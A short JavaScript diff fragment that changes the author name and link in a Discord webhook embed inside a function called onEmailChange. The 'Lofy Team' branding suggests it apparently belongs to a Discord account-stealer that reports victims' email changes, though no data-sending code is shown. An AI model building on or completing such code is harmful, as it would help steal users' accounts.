@@ -241,8 +241,8 @@ function onEmailChange(e, t, n) {
 				avatar_url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png",
 				embeds: [{
 					author: {
-						name: 'By Lofy Team',
-						url: "https://notfubuki.glitch.me",
+						name: '2341',
+						url: "https://discord.com",
 						icon_url: "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048"
 					},
 					color: 43690,
